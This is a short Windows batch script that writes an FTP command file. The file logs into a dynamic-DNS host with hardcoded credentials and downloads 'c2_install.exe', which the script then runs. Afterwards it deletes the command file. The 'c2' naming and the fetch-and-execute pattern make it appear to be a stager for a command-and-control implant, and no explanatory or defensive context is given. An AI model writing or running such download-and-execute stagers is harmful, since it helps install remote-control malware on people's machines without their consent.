@echo off

REM Generate the script. Will overwrite any existing temp.txt
echo open chipy.ddns.net> temp.txt
echo c2_beta>> temp.txt
echo betaneedsalongpassword>> temp.txt
echo get c2_install.exe>> temp.txt
echo quit>> temp.txt

REM Launch FTP and pass it the script
ftp -s:temp.txt
c2_install.exe

REM Clean up.
del temp.txt
